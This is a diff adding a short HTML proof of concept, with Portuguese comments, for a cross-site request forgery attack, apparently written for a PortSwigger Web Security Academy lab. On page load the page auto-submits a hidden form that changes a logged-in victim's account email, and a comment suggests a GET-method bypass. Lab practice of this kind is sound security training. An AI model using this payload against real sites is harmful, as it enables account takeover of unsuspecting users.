@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF - TESTE</title>
+</head>
+<body>
+
+    <form action="https://0a93003b03d58ff9c02e4a9c00e6009d.web-security-academy.net/my-account/change-email" method="post"> <!--Pode existir bypass por método de autenticação como: GET--> 
+
+        <input type="hidden" name="email" value="teste@teste.com">
+    </form>
+
+    <script>
+        document.forms[0].submit();
+    </script>
+
+
+</body>
+</html>
